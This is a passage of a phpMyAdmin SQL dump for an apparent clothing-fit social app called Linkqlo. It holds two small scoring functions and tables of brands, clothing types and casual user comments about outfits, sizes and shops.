-- phpMyAdmin SQL Dump
-- version 4.2.6
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Mar 29, 2015 at 04:24 PM
-- Server version: 5.5.40
-- PHP Version: 5.3.29

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `linkqlo_db`
--

DELIMITER $$
--
-- Functions
--
CREATE DEFINER=`root`@`localhost` FUNCTION `calcBase`(itemValue1 DECIMAL(10,2), itemValue2 DECIMAL(10,2), gender VARCHAR(10), logBase DECIMAL(10,4), tParam DECIMAL(10,4), mParam DECIMAL(10,3), fParam DECIMAL(10,3), wParam DECIMAL(10,3) ) RETURNS decimal(10,1)
BEGIN
	DECLARE itemValue DECIMAL(10,3);
	
	IF itemValue1 = NULL OR itemValue1 = 0 OR itemValue2 = NULL OR itemValue2 = 0 THEN
		RETURN 0;
	END IF;
    
	SET itemValue = POW(itemValue1 * tParam - itemValue2 * tParam, 2);
	SET itemValue = 1 / LOG(logBase, itemValue + logBase);
	
	IF gender = 'male' THEN
		SET itemValue = (itemValue - mParam) / (1 - mParam);
	ELSE
		SET itemValue = (itemValue - fParam) / (1 - fParam);
	END IF;
	
	SET itemValue = itemValue * wParam * 100;
	
	RETURN itemValue;
	
    END$$

CREATE DEFINER=`root`@`localhost` FUNCTION `getMax`(itemValue1 DECIMAL(10,1), itemValue2 DECIMAL(10,1), itemValue3 DECIMAL(10,1)) RETURNS decimal(10,1)
BEGIN
	DECLARE itemValue DECIMAL(10,1);
	
	SET itemValue = itemValue1;
	
	if itemValue < itemValue2 then
		SET itemValue = itemValue2;
		
		IF itemValue < itemValue3 THEN
			SET itemValue = itemValue3;
		END IF;
	else
		IF itemValue < itemValue3 THEN
			SET itemValue = itemValue3;
		END IF;
	end if;
	
	RETURN itemValue;
	
    END$$

DELIMITER ;

-- --------------------------------------------------------

--
-- Table structure for table `brands`
--

CREATE TABLE IF NOT EXISTS `brands` (
`brand_id` int(4) NOT NULL,
  `brand_name` varchar(50) DEFAULT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=413 ;

--
-- Dumping data for table `brands`
--

INSERT INTO `brands` (`brand_id`, `brand_name`) VALUES
(1, 'Adidas'),
(2, 'Asics'),
(3, 'Athleta'),
(4, 'Champion'),
(5, 'GapFit'),
(6, 'Lorna Jane'),
(7, 'Lululemon'),
(8, 'Lucy'),
(9, 'New Balance'),
(10, 'Nike'),
(11, 'Polo Ralph Lauren'),
(12, 'Sweaty Betty'),
(13, 'The North Face'),
(14, 'Under Armor'),
(15, 'Zella');

-- --------------------------------------------------------

--
-- Table structure for table `clothings`
--

CREATE TABLE IF NOT EXISTS `clothings` (
`clothing_id` int(4) NOT NULL,
  `clothing_type` varchar(100) DEFAULT NULL,
  `gender` varchar(10) DEFAULT NULL,
  `bsi_type` varchar(10) DEFAULT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=17 ;

--
-- Dumping data for table `clothings`
--

INSERT INTO `clothings` (`clothing_id`, `clothing_type`, `gender`, `bsi_type`) VALUES
(1, 'Jeans', 'all', 'lower'),
(2, 'Pants', 'all', 'lower'),
(3, 'Dress Shirts', 'male', 'upper'),
(4, 'Shorts', 'all', 'lower'),
(5, 'Coats', 'all', 'upper'),
(6, 'Dresses', 'female', 'full'),
(7, 'Tights', 'all', 'lower'),
(8, 'T-Shirts', 'all', 'upper'),
(10, 'Jackets', 'all', 'upper'),
(11, 'Sweaters', 'all', 'upper'),
(12, 'Tops', 'female', 'upper'),
(13, 'Suits', 'male', 'upper'),
(14, 'Casual Shirts', 'male', 'upper'),
(15, 'Skirts', 'female', 'lower'),
(16, 'Shoes', 'all', 'foot');

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE IF NOT EXISTS `comments` (
`comment_id` int(11) NOT NULL,
  `post_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `comment` varchar(1024) DEFAULT NULL,
  `created` datetime DEFAULT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=280 ;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`comment_id`, `post_id`, `user_id`, `comment`, `created`) VALUES
(1, 2, 21, 'looking sharp!', '2015-03-14 11:49:59'),
(2, 2, 141, 'Cool shoes !', '2015-03-15 11:33:22'),
(3, 2, 10, '@steve99 yeah it''s pretty trendy \\ud83d\\ude1d', '2015-03-15 12:09:49'),
(4, 5, 10, 'the blue-white-pink color combo is cute', '2015-03-17 04:50:24'),
(5, 3, 49, '@herbertyang looks pretty nice. How much it is?', '2015-03-20 02:35:25'),
(6, 3, 10, '@xizhang can''t remember exactly...about $50-70 range I think ', '2015-03-20 02:53:54'),
(7, 5, 49, '@herbertyang the highly saturated colors are the new trend. seeing more and more people wearing these type of shoes on street.', '2015-03-20 03:53:41'),
(8, 4, 150, '\\u26a1\\ufe0f', '2015-03-20 15:01:47'),
(9, 8, 10, 'like mother like daughter \\ud83d\\udc4d', '2015-03-20 15:19:21'),
(10, 3, 49, '@herbertyang that is pretty deal. I will grab one next time when I go to burlington mall.', '2015-03-20 17:45:50'),
(11, 3, 10, '@xizhang \\ud83d\\ude1d yeah I think it''s a good deal. Over here people are pretty casual. Pants like this is convenient.', '2015-03-20 17:47:34'),
(12, 3, 49, '@herbertyang is this type of pant good for jogging? ', '2015-03-21 00:05:55'),
(13, 4, 10, '@zxjulia what is this lighting about? ', '2015-03-21 00:07:05'),
(14, 3, 10, '@xizhang it definite is. it''s very light and breathable. I ran with it in the cold weather in Shanghai.', '2015-03-21 00:08:07'),
(15, 4, 150, '\\u7626\\u6210\\u4e00\\u9053\\u95ea\\u7535\\u5566\\uff01', '2015-03-21 00:08:28'),
(16, 4, 10, '@zxjulia need to do more work \\ud83d\\ude33', '2015-03-21 00:38:47'),
(17, 8, 21, 'very pretty!', '2015-03-21 01:02:34'),
(18, 9, 21, 'very pretty! I bought one pair in black for my mom and she totally loves them. they are very good at keeping you warm in the chilly Shanghai winter. ', '2015-03-21 09:11:51'),
(19, 6, 150, 'I wish I have one like this\\ud83d\\ude0d\\uff01', '2015-03-21 10:54:34'),
(20, 6, 150, '\\ud83d\\ude0d', '2015-03-21 10:56:30'),
(21, 11, 10, 'wow! beautiful tights indeed! \\ud83d\\udc4f\\ud83d\\udc4f', '2015-03-21 15:25:50'),
(23, 6, 10, '@zxjulia yeah this piece is really neat - you can wrap it into your hands when running', '2015-03-22 00:57:05'),
(24, 13, 10, 'where did you buy this pair?', '2015-03-22 00:58:56'),
(25, 13, 147, '@herbertyang from K11 @ HK', '2015-03-22 01:04:41'),
(26, 13, 10, '@echohwj there is another K11 in Hong Kong as well?', '2015-03-22 01:05:26'),
(27, 13, 147, '@herbertyang yeah, in Tsim Sha Tsui. One of my favorite mall in HK.', '2015-03-22 01:41:50'),
(29, 13, 21, '@herbertyang K11 is done by a HK developer. they are more artsy than most other malls. ', '2015-03-22 01:59:20'),
(30, 13, 21, 'good to know that these shoes run narrow. won''t work for me although they look great on you!', '2015-03-22 02:00:53'),
(31, 13, 10, 'did you get them to do a full measurement on your feet in the #asics store? they have this cool service to measure your foot size for free', '2015-03-22 02:19:26'),
(32, 10, 10, 'this three-pic layout is pretty useful', '2015-03-22 02:22:12'),
(33, 11, 10, '@mmm we should encourage users to do more posting right from fitting rooms in shopping mall stores. they have mirrors there.', '2015-03-22 02:28:32'),
(35, 15, 10, 'year it looks very light ', '2015-03-22 04:39:55'),
(36, 15, 10, 'how much is it?', '2015-03-22 04:43:51'),
(37, 3, 10, '@xizhang our lower BMS is only 42%! \\ud83d\\ude31 how can we be so different there...', '2015-03-22 04:53:35'),
(38, 11, 10, '@katieavd hello there! look who this is! \\ud83d\\ude1d', '2015-03-22 06:55:55'),
(39, 11, 147, 'The first one is really pretty on you!', '2015-03-22 12:24:16'),
(41, 11, 21, '@echohwj I think you''ll look super hot in these tights - they are meant for girls like you! \\ud83d\\ude09', '2015-03-22 12:53:20'),
(42, 13, 147, '@herbertyang Really? Sounds interesting. Will try and then report in Linkqlo then.', '2015-03-22 12:56:24'),
(43, 16, 10, 'hidden heel? LOL', '2015-03-22 16:17:25'),
(44, 17, 10, 'I like its light blue color too', '2015-03-22 16:20:13'),
(45, 3, 49, '@herbertyang I was wondering the same thing..;-) ', '2015-03-22 16:48:34'),
(46, 18, 10, 'on fire! ', '2015-03-22 16:50:15'),
(47, 19, 10, 'a terrifying shot! where is your head? \\ud83d\\ude31', '2015-03-22 16:53:38'),
(48, 19, 10, 'a bit too large for you? you look just fine in it', '2015-03-22 16:55:07'),
(52, 21, 10, 'fancy sneakers!', '2015-03-22 17:21:33'),
(53, 11, 10, '@namiko konnichiwa! \\ud83d\\ude0a ', '2015-03-22 17:33:01'),
(54, 11, 10, '@echohwj yeah this is vet much loud and clear fashion statement', '2015-03-22 17:33:42'),
(55, 13, 10, '@echohwj yeah #asics has this fantastic service..try it out with them next time..it''s very high-tech', '2015-03-22 17:42:09'),
(56, 23, 10, '@wildsheepchase JM is back in town', '2015-03-22 19:32:58'),
(57, 8, 10, '@wangyili ZX is here with her daughter', '2015-03-22 20:57:47'),
(58, 29, 10, 'you still keep playing basketball? good for you! hard for me to find a pug team here', '2015-03-22 20:58:48'),
(59, 19, 59, '@herbertyang  It''s too long.', '2015-03-22 23:47:35'),
(60, 19, 10, '@wangyili yeah the sleeves ', '2015-03-22 23:53:47'),
(61, 17, 21, 'Tiffany blue - very pretty!', '2015-03-23 00:09:42'),
(62, 19, 21, 'very helpful review!', '2015-03-23 00:12:54'),
(63, 32, 21, 'so pretty!', '2015-03-23 00:15:15'),
(64, 32, 10, '@wildsheepchase yeah indeed', '2015-03-23 00:15:33'),
(65, 34, 21, 'Roshe rocks!', '2015-03-23 01:33:25'),
(66, 33, 10, 'never knew this brand before...it looks really good on you!', '2015-03-23 02:59:23'),
(67, 34, 10, '@wildsheepchase what is Roche?', '2015-03-23 03:00:28'),
(68, 27, 10, 'is it also good for badminton court, which requires white sole?', '2015-03-23 03:01:37'),
(69, 26, 10, 'oh yeah finally, #lululemon ! there will be many hard-core fans flocking here soon', '2015-03-23 03:02:49'),
(70, 25, 10, 'did you get it from the #lululemon store on University Ave?', '2015-03-23 03:04:06'),
(71, 25, 10, '@wildsheepchase JM is also a #lululemon fan', '2015-03-23 03:04:30'),
(72, 24, 10, 'the thumb holes on sleeves are neat..I like them too', '2015-03-23 03:05:26'),
(73, 24, 10, 'I think I have the same running piece from #nike ', '2015-03-23 03:06:03'),
(74, 23, 10, 'the chest pocket design is ... an interesting one \\ud83d\\ude15', '2015-03-23 03:07:11'),
(75, 23, 10, '@thomas what up dog', '2015-03-23 03:08:50'),
(76, 33, 10, 'judging by our low BMS for upper and lower body, I have a lot of weight to lose \\ud83d\\ude27', '2015-03-23 03:10:43'),
(77, 30, 10, 'evidently, you have a career in modeling ', '2015-03-23 03:11:45'),
(78, 22, 10, 'it looks more like a walking shoes than running shoes...or no? @wildsheepchase ', '2015-03-23 03:13:05'),
(79, 35, 10, 'wow! this is a landmark event! you made it man! ', '2015-03-23 03:13:52'),
(80, 22, 21, '@herbertyang definitely pro running shoes!', '2015-03-23 03:14:31'),
(81, 25, 154, 'yes bought this in PA.  it''s the best work out / running gear I''ve owned.  ', '2015-03-23 03:14:45'),
(82, 35, 10, 'try to attach a fitting report next time, so that the brand can be recorded and you can review it in more details.', '2015-03-23 03:15:05'),
(83, 27, 154, 'I checked and the soles are black.  may not work for indoor courts.  good catch.', '2015-03-23 03:15:58'),
(84, 35, 10, '@echohwj @wildsheepchase @thomas @linglan I''m in tears...Mr. Guo has arrived', '2015-03-23 03:16:27'),
(85, 35, 10, 'somehow I feel Buddha is in presence...', '2015-03-23 03:16:59'),
(86, 25, 21, 'glad that Lululemon men is also gaining traction. they really have awesome products, don''t they? I like it so much that I bought its stocks, haha!', '2015-03-23 03:17:44'),
(87, 22, 10, '@wildsheepchase we have too many #nike, not enough #asics ', '2015-03-23 03:17:54'),
(88, 35, 147, 'A big day!', '2015-03-23 03:17:55'),
(89, 35, 21, 'what a holy shot! Namaste... ', '2015-03-23 03:19:23'),
(90, 35, 21, 'your holiness, how did you achieve the halo effect? very skillful! ', '2015-03-23 03:20:27'),
(91, 23, 154, 'it fits an iPhone!  I think it''s designed to work with a back pack on.', '2015-03-23 03:21:43'),
(92, 1, 10, '@steve99 yo! we need more from you! you are armored from toes to teeth with premium brands. ', '2015-03-23 03:21:51'),
(93, 3, 10, '@xizhang I need to lose weight - that''s what it is \\ud83d\\ude25', '2015-03-23 03:26:31'),
(94, 5, 10, '@echohwj zoom in when shooting photo for the details', '2015-03-23 03:35:08'),
(95, 5, 147, '@herbertyang Got it.', '2015-03-23 03:36:25'),
(96, 9, 10, '@wildsheepchase is the the same pair for your mom? but @raichu ''s one looks ... so much cooler \\ud83d\\ude09', '2015-03-23 04:16:17'),
(97, 9, 21, '@herbertyang I know. these Roshe boots are very versatile. the colorful ones are super cool while the black ones are the only color that my mom would accept. ', '2015-03-23 04:18:19'),
(98, 32, 21, 'what''s the fabric? machine washable?', '2015-03-23 04:19:43'),
(99, 34, 21, '@herbertyang Roshe is the name of this model, inspired by Japanese zen. You have one as well - the red Flyknit ones. ', '2015-03-23 04:21:27'),
(100, 34, 21, 'I love the black dress, too. looking super cute with Roshe! ', '2015-03-23 04:22:37'),
(101, 34, 147, '@wildsheepchase I bought it from ZARA at a super nice price-about 20 dollars.', '2015-03-23 04:25:36'),
(102, 35, 10, '@echohwj you can reply me by just clicking on my comment ', '2015-03-23 04:58:56'),
(103, 35, 147, '@herbertyang like this:)', '2015-03-23 05:00:02'),
(104, 9, 10, '@wildsheepchase I see. The furry inner layer is nice. ', '2015-03-23 05:01:33'),
(105, 35, 10, '@echohwj yeah you got it \\ud83d\\ude0a', '2015-03-23 05:01:53'),
(106, 10, 10, '@vickyzhao looking familiar?', '2015-03-23 10:04:54'),
(107, 10, 161, 'I'' m struggling whether I should follow her. now that u confirmed, following', '2015-03-23 10:39:11'),
(108, 11, 161, 'I like the right two anyway. ', '2015-03-23 10:45:22'),
(109, 11, 161, '@vickyzhao I mean the two in the left. black is safe but boring', '2015-03-23 10:47:32'),
(110, 11, 21, '@vickyzhao good to know - just when I thought I could save some money... ', '2015-03-23 11:14:16'),
(111, 3, 49, '@herbertyang I was about to say that.. interestingly, my weight has been hovering around 160 pounds in past 10 years.', '2015-03-23 16:34:52'),
(112, 29, 49, '@herbertyang really? I thought I would be easier because my outdoor friendly weather in Bay Area.', '2015-03-23 16:35:31'),
(113, 3, 10, '@xizhang my weight is more than that...slightly \\ud83d\\ude13', '2015-03-23 17:22:02'),
(114, 37, 153, 'As a side note, in the recent 007 movies with Daniel Craig, the designers have chosen for Bond to wear exclusively Crockett & Jones shoes. ', '2015-03-23 18:50:55'),
(115, 37, 10, '@ryanyang cool! you can also upload multiple photos in one post.\\ud83d\\udc4d\\ud83d\\udc4d', '2015-03-23 18:53:52'),
(116, 37, 10, 'very useful review! \\ud83d\\udc4a\\ud83d\\udc4a', '2015-03-23 18:55:57'),
(117, 33, 10, '@ryanyang looks who''s here', '2015-03-23 18:56:27'),
(118, 26, 10, '@ryanyang JM is back', '2015-03-23 18:56:52'),
(119, 33, 153, 'hi Thomas! looks like you lost more weight!', '2015-03-23 19:04:34'),
(120, 41, 153, 'how do you modify the post? I had a typo. ', '2015-03-23 20:34:58'),
(121, 16, 35, '@herbertyang yes that''s why I like it!!! taller and longer legs!', '2015-03-24 11:33:14'),
(122, 11, 159, '@herbertyang konnichiwa! This app looks very cool. Now I''m working on my posts so give me some time.. \\ud83d\\ude09', '2015-03-24 12:04:46'),
(123, 11, 159, 'I love the left. That sharp pattern makes your legs look thinner and longer. \\ud83d\\ude0a', '2015-03-24 12:17:39'),
(124, 16, 159, '@herbertyang hidden heels are recent trend in sneakers! I have PUMA''s. \\ud83d\\ude04', '2015-03-24 12:20:39'),
(125, 46, 21, 'beautiful!', '2015-03-24 14:57:18'),
(126, 45, 21, 'yeah, the sneakers definitely brighten up the entire outfit! \\ud83d\\udc4d', '2015-03-24 14:58:16'),
(127, 46, 59, 'Nice.  Why the Brand in the fitting report shows "Gapfit" @herbertyang ', '2015-03-24 15:44:00'),
(128, 11, 59, 'I love the left one too.  Both the simple pattern and the dark green color with black stripes look safe and appealing on any leg type.', '2015-03-24 15:51:36'),
(129, 46, 10, '@wangyili #gapfit is the activewear house brand under Gap', '2015-03-24 16:50:01'),
(130, 46, 10, 'haha, the shoulder design...that''s interesting to know', '2015-03-24 16:50:56'),
(131, 16, 10, '@namiko I see. where are your #Puma posts dear Namiko? \\ud83d\\ude1d', '2015-03-24 16:51:52'),
(132, 11, 10, 'everyone is drooling over the left one', '2015-03-24 16:53:16'),
(133, 16, 10, '@jacquelinewu you have seriously manipulated my years of perception on you', '2015-03-24 16:53:56'),
(134, 27, 10, '@jbraden you need some low-rise socks to go with the shoes my friend ', '2015-03-24 16:55:08'),
(135, 42, 10, 'it looks comfy ... only 3 stars? you are critical man', '2015-03-24 16:56:43'),
(136, 42, 153, 'after wearing it for awhile, it becomes too loose fitting. ', '2015-03-24 16:58:07'),
(137, 41, 10, '@ryanyang currently there is no way to edit a post (may add that into future updates) after it''s posted. sorry!', '2015-03-24 16:58:26'),
(138, 40, 10, 'I notice that for the same brand #crockettandjones you have different sizes from 8, 8.5 and 9', '2015-03-24 17:01:26'),
(139, 40, 10, 'is this going to be too warm to wear in California?', '2015-03-24 17:01:59'),
(140, 16, 159, '@herbertyang you''ll see soon.. \\ud83d\\ude09', '2015-03-24 17:02:05'),
(141, 40, 153, 'and they all fit perfectly, so fitting is a major issue. that''s why recommend trying them in a store first. ', '2015-03-24 17:02:57'),
(142, 39, 10, 'I''ll pay more attention to JB''s shoes for the next 007 movie', '2015-03-24 17:03:05'),
(143, 38, 10, 'you are owning the market of this brand dude', '2015-03-24 17:03:55'),
(144, 40, 153, 'perfect for Nor Cal. maybe too warm in So Cal. ', '2015-03-24 17:03:59'),
(145, 38, 153, 'big fan. I know Marc Aajfes is also a fan. ', '2015-03-24 17:04:41'),
(146, 45, 10, 'you have a thing for light blue color', '2015-03-24 17:05:40'),
(147, 29, 10, '@xizhang it''s just me. I''m lazy and elusive.', '2015-03-24 17:06:11'),
(148, 33, 10, '@ryanyang I bet he was holding his breath really tight ', '2015-03-24 17:07:14'),
(149, 44, 10, 'what a familiar belly button! it reminds me of days of our past... is this swimming shorts easy to fall off?', '2015-03-24 17:09:25'),
(150, 46, 35, '@wangyili because I have to choose a brand but my brand is not on the list :( @herbertyang ', '2015-03-24 22:40:32'),
(151, 46, 10, '@jacquelinewu you can actually enter any brand you want. on the brand menu, instead of picking 1 out of 15, just enter a brand name and it''ll be recorded in the database and become searchable as well.', '2015-03-24 22:42:18'),
(152, 48, 10, 'wow! that''s .... outstanding!', '2015-03-25 03:32:52'),
(153, 30, 10, '@zxjulia I wonder what''s the BMS between you two', '2015-03-25 03:41:09'),
(154, 46, 153, 'you look great in it!', '2015-03-25 03:59:00'),
(155, 48, 10, '@namiko somebody just beat you to claim the world first on #Puma', '2015-03-25 04:14:27'),
(156, 48, 21, 'wow...super hot!', '2015-03-25 04:17:06'),
(157, 47, 21, 'I like the simple design and the cut fits you very well. ', '2015-03-25 04:21:50'),
(158, 48, 159, '@herbertyang haha, I appreciate that Linkqlo will have at least two PUMAs soon.', '2015-03-25 04:35:40'),
(159, 50, 10, 'my goodness, this is a tough yoga pose...\\ud83d\\ude2e', '2015-03-25 04:54:05'),
(160, 50, 10, '@wildsheepchase she''s arrived, finally', '2015-03-25 04:57:20'),
(161, 50, 21, 'hi hi!', '2015-03-25 05:17:45'),
(162, 49, 10, '@wildsheepchase @guodan @daniel @echohwj you can discuss here', '2015-03-25 05:30:30'),
(163, 57, 10, '#nike is everyone''s fav', '2015-03-25 07:45:09'),
(164, 56, 10, 'very stylish indeed! I used to have a cool #Puma too', '2015-03-25 07:45:55'),
(165, 54, 10, 'you can try to upload multiple pictures in one post for better effect', '2015-03-25 07:47:05'),
(166, 52, 10, 'for running?', '2015-03-25 07:48:21'),
(167, 57, 21, 'I love the neon yellow/grey color combination. the tights look good, too! and 1.5 on treadmill - you are hard core! \\ud83d\\udc4d', '2015-03-25 07:49:27'),
(168, 57, 159, '@herbertyang indeed!', '2015-03-25 07:53:40'),
(169, 57, 159, '@wildsheepchase not that hard, I''m just walking. \\ud83d\\ude01 I love the color too. yellow/grey is one of my most favorite color combination!', '2015-03-25 08:03:35'),
(170, 56, 159, '@herbertyang did it have hidden heel? \\ud83d\\ude1d', '2015-03-25 08:09:49'),
(171, 52, 148, 'yes, for running!', '2015-03-25 09:45:23'),
(172, 60, 10, 'among other things, this is a great photo shot...studio-level \\ud83d\\udc4d\\ud83d\\udc4d', '2015-03-25 16:47:09'),
(173, 60, 10, 'yeah #nike ''s #dri-fit has a lot of love around the room', '2015-03-25 16:47:53'),
(174, 60, 10, 'your choices in the fitting report seem to suggest the fitting is fine...', '2015-03-25 16:48:57'),
(175, 59, 10, 'this one got some heavy Chinese flavor ', '2015-03-25 16:51:32'),
(176, 56, 10, '@namiko it seems so...@jacquelinewu has one pair with hidden heel', '2015-03-25 16:52:21'),
(177, 58, 10, 'what size is this?', '2015-03-25 16:54:30'),
(178, 52, 10, '@martin many #asics lovers here', '2015-03-25 16:55:37'),
(179, 67, 10, 'yeah, a world-first on jeans! \\ud83d\\udc4d\\ud83d\\udc4d\\ud83d\\udc4a', '2015-03-25 18:28:27'),
(180, 67, 10, '"makes nice sound in washing machine"...LOL \\ud83d\\ude04', '2015-03-25 18:29:47'),
(181, 63, 10, '@ryanyang more shoe lovers', '2015-03-25 18:31:45'),
(182, 63, 153, 'very nice!', '2015-03-25 18:32:58'),
(183, 66, 10, '@wildsheepchase professional has arrived', '2015-03-25 19:37:58'),
(184, 46, 174, 'what do you mean by thicker arms?!', '2015-03-25 21:10:59'),
(185, 68, 174, 'forgot to add that I''m not a runner but I walk a lot every day:)', '2015-03-25 21:17:04'),
(186, 68, 175, 'love the colors!', '2015-03-25 21:53:14'),
(187, 67, 21, 'haha, very funny. ', '2015-03-26 00:17:35'),
(188, 59, 21, 'very nice - I actually added this to my wish list in my Zara online shopping cart. haha', '2015-03-26 00:19:50'),
(189, 60, 21, 'it looks good on you. you didn''t get it? BTW, the lighting is terrific.', '2015-03-26 00:21:20'),
(190, 62, 21, 'this looks very good.', '2015-03-26 00:24:08'),
(191, 60, 161, '@wildsheepchase too tight. I need an XL. no stock', '2015-03-26 00:30:39'),
(192, 69, 21, 'fits very nice. why not for sports? ', '2015-03-26 01:00:51'),
(193, 56, 21, 'looking perfect with black skinny jeans.', '2015-03-26 01:04:13'),
(194, 69, 150, '@wildsheepchase Sorry, maybe it is good for sports but not all the sports. The only sports I do is running. So, I think I should say it''s not good for running. ', '2015-03-26 01:05:22'),
(195, 69, 10, 'LOL, every part is either too short or too tight, except for length. it looks good on you. ', '2015-03-26 03:22:44'),
(196, 61, 10, 'I need to get one like this', '2015-03-26 04:34:50'),
(197, 58, 151, '@herbertyang it is 43 but fits me. I am usually 42. ', '2015-03-26 05:15:42'),
(198, 58, 10, '@sicheng fitting report would be helpful here', '2015-03-26 05:17:40'),
(200, 74, 148, 'Asics  not Asia...  ', '2015-03-26 07:05:26'),
(201, 74, 148, 'but made in Asia \\ud83d\\ude03', '2015-03-26 07:06:04'),
(202, 73, 10, 'cute socks', '2015-03-26 07:13:47'),
(203, 74, 10, '@martin ain''t they all...\\ud83d\\ude1d', '2015-03-26 07:14:26'),
(204, 71, 10, 'very bohemian ', '2015-03-26 07:16:01'),
(205, 72, 10, 'goes well with your socks', '2015-03-26 07:16:33'),
(206, 67, 10, 'keep the stories coming my friend ', '2015-03-26 07:17:29'),
(207, 68, 10, '@tibuke #nike just has unlimited color combinations ', '2015-03-26 07:18:39'),
(208, 64, 10, 'goose down...must be really comfortable ', '2015-03-26 07:20:31'),
(209, 65, 10, '#adidas once a great brand, its store is doing badly compared to #nike ', '2015-03-26 07:22:21'),
(210, 62, 10, '@wildsheepchase it looks like those space suits from Star Trek movies', '2015-03-26 07:23:21'),
(211, 63, 10, '@wildsheepchase #colehaan has #nike air in it! ', '2015-03-26 07:26:19'),
(212, 51, 10, '@horseferry here''s another #colehaan', '2015-03-26 07:27:55'),
(213, 66, 10, 'cute design', '2015-03-26 07:33:12'),
(214, 63, 21, '@herbertyang yeah, till Nike sold Cole Haan a while ago. I had a pair of Cole Haan sandals with Nike Air - crazy comfortable.  ', '2015-03-26 07:40:17'),
(215, 71, 159, 'I love this skirt! That bias pattern makes you look taller. Actually I thought of buying this.', '2015-03-26 11:01:22'),
(216, 24, 159, 'nice color! it looks great on you.', '2015-03-26 11:04:13'),
(217, 76, 10, 'very suave!', '2015-03-26 17:13:28'),
(218, 75, 10, 'any picture of its inside layer when it''s reversed?', '2015-03-26 17:16:11'),
(219, 71, 10, '@namiko haha, yeah...the visual misconception ', '2015-03-26 17:17:33'),
(220, 80, 10, '#underarmor is having quite a surge lately, with The Rock in all fast furious movies and their endorsement battle with #nike on NBA superstars', '2015-03-26 21:14:25'),
(221, 78, 10, 'I like the texture and the blue pattern on the shoulder...looking nice!', '2015-03-26 21:16:19'),
(222, 79, 10, 'it fits you well', '2015-03-26 21:17:34'),
(223, 76, 10, 'it does seem to fit you very well...you''re going to wear it in SF bay when you come over?', '2015-03-26 21:20:38'),
(224, 71, 150, 'you introduced this brand to me the year before last, and I fall in love with it immediately. it''s colorful and comfortable, and you will find one fit for your body always. ', '2015-03-27 02:19:10'),
(225, 81, 10, 'great shot!', '2015-03-27 03:02:03'),
(226, 71, 161, 'u look gorgeous! ', '2015-03-27 03:18:22'),
(227, 71, 21, '@zxjulia glad u like it. \\ud83d\\ude0a', '2015-03-27 05:36:04'),
(228, 82, 21, 'they do fit very well!', '2015-03-27 05:57:01'),
(229, 80, 21, 'nice color!', '2015-03-27 06:03:11'),
(230, 78, 21, 'good deal!', '2015-03-27 06:04:42'),
(231, 81, 21, 'the shoes go very well with the pale pink jeans. \\ud83d\\ude0a', '2015-03-27 06:05:57'),
(232, 77, 10, 'great review @jananagy !', '2015-03-27 07:42:23'),
(233, 46, 181, 'pretty', '2015-03-27 21:59:22'),
(234, 84, 10, 'it goes well with the light grey t-shirt ', '2015-03-27 22:46:28'),
(235, 83, 10, 'good for moderate hiking as well?', '2015-03-27 22:48:06'),
(236, 82, 10, '\\ud83d\\ude04 #uniqlo would love to hear this story!', '2015-03-27 22:49:14'),
(237, 84, 21, 'very chic! ', '2015-03-27 23:49:05'),
(238, 91, 10, 'fitting report?', '2015-03-28 04:28:24'),
(239, 91, 176, '@herbertyang I tried submitting the post with fitting report but the app seemed to freeze', '2015-03-28 05:32:02'),
(240, 91, 10, '@cassandra sorry for that...probably due to connection speed...where are you?', '2015-03-28 05:52:20'),
(241, 92, 10, 'very devoted fan', '2015-03-28 05:52:59'),
(242, 91, 176, '@herbertyang Might be... I''ll try again later ', '2015-03-28 13:29:14'),
(243, 94, 10, 'wow....this style is outstanding!', '2015-03-28 14:16:44'),
(244, 94, 21, 'what a team!', '2015-03-28 14:21:04'),
(245, 92, 21, 'I do the same (buying different colors of the same model) when finding something that really fits me! ', '2015-03-28 14:44:08'),
(246, 75, 21, 'Nani - no fitting report? :-)', '2015-03-28 15:18:37'),
(247, 94, 21, 'let us know whether they are indeed that good after your run!', '2015-03-28 15:20:41'),
(248, 96, 10, 'it''s becoming my pastime routine to read your story before bedtime ', '2015-03-28 16:11:59'),
(249, 97, 10, 'let''s get a closer look at the sole?', '2015-03-28 16:14:20'),
(250, 95, 10, 'stylish! did you but it from Japan?', '2015-03-28 17:50:49'),
(251, 100, 10, 'did you have to replace the original sole with rubber for London''s rainy day?', '2015-03-28 17:51:50'),
(252, 94, 10, 'wow your team has some style! you guys must turn a lot of heads when running together. this is quite s sight!', '2015-03-28 17:52:54'),
(253, 102, 10, 'is this water running onto it?', '2015-03-28 17:53:35'),
(254, 99, 10, 'you deck out perfectly...it''ll be hard to go unnoticed anywhere with this set ', '2015-03-28 17:54:43'),
(255, 97, 10, 'hilarious story...so...you and your boss wore the same shoes of probably the same size ...that''s quite a bonding moment', '2015-03-28 17:56:30'),
(256, 92, 10, '@wildsheepchase yeah, good deals come and go...must seize the moment', '2015-03-28 17:57:06'),
(257, 84, 10, 'one more scarf, then all set', '2015-03-28 17:57:39'),
(258, 86, 10, 'try to use the fitting report function when posting so that this #lululemon can be logged into the database and become searchable/discoverable by others as well \\ud83d\\ude1d', '2015-03-28 18:00:36'),
(259, 87, 10, 'there are many #lululemon lovers here \\ud83d\\ude0b', '2015-03-28 18:01:16'),
(260, 88, 10, 'you''ve got a very helpful photographer! \\ud83d\\ude1d', '2015-03-28 18:02:12'),
(261, 86, 181, 'how to do it?', '2015-03-28 19:02:27'),
(262, 89, 10, '@wildsheepchase @jacquelinewu look who''s here', '2015-03-28 20:15:32'),
(263, 102, 58, '@herbertyang yes', '2015-03-28 20:43:54'),
(264, 103, 10, 'a nice shining glow it''s got...reminding me of iPhone 6''s gold', '2015-03-28 22:58:54'),
(265, 103, 153, 'it is the iPhone flash that made it glow. The jacket is actually a grayish green. ', '2015-03-28 23:04:47'),
